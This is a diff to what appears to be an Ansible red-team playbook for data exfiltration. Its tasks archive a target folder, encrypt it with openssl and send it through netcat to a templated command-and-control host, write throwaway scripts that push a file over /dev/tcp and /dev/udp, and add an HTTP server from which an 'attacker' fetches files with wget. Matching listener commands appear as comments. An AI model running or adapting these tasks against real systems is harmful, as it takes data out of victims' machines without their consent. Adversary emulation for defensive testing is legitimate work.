@@ -19,7 +19,7 @@
     - name: Exfiltration Over Alternative Protocol - SSL/443
       shell: |
         tar czpf - {{ exfiltration_folder }}/* | openssl aes-256-cbc -salt -k {{ password_encryption }} | nc -w1 {{ exfil_fqdn }} {{ cnc_port }}
-        # attacker: nc -lp {{ cnc_port }} | openssl aes-256-cbc -d -k $pass {{ password_encryption }} > {{ exfiltration_file }}-ssl.tar.gz.enc
+      # attacker: nc -lp {{ cnc_port }} | openssl aes-256-cbc -d -k $pass {{ password_encryption }} > {{ exfiltration_file }}-ssl.tar.gz.enc
     - name: Create Archive File
       archive:
         path: "{{ exfiltration_folder }}/*"
@@ -32,11 +32,17 @@
         echo 'cat /tmp/{{ exfiltration_file }}.gz > /dev/tcp/{{ exfil_fqdn }}/{{ exfil_port }}' >> /tmp/exfil-tcp.sh
         bash /tmp/exfil-tcp.sh
         rm /tmp/exfil-tcp.sh
-      # netcat -lvp > {{ exfiltration_file }}-tcp.gz
+      # attacker: netcat -lvp > {{ exfiltration_file }}-tcp.gz
     - name: Exfiltration Over Alternative Protocol UDP
       shell: |
         echo '#!/bin/bash' > /tmp/exfil-udp.sh
         echo 'cat /tmp/{{ exfiltration_file }}.gz > /dev/udp/{{ exfil_fqdn }}/{{ exfil_port }}' >> /tmp/exfil-udp.sh
         bash /tmp/exfil-udp.sh
         rm /tmp/exfil-udp.sh
-        # netcat -lvp > {{ exfiltration_file }}-udp.gz
+      # attacker: netcat -lvp > {{ exfiltration_file }}-udp.gz
+    - name: Exfiltration Over Alternative Protocol - HTTP
+    # required inbound port open
+      shell: |
+        cd {{ exfiltration_folder }}
+        python -m SimpleHTTPServer {{ exfil_port }}
+        # attacker: wget http://VICTIM_IP:{{ exfil_port }}/victim-file.txt
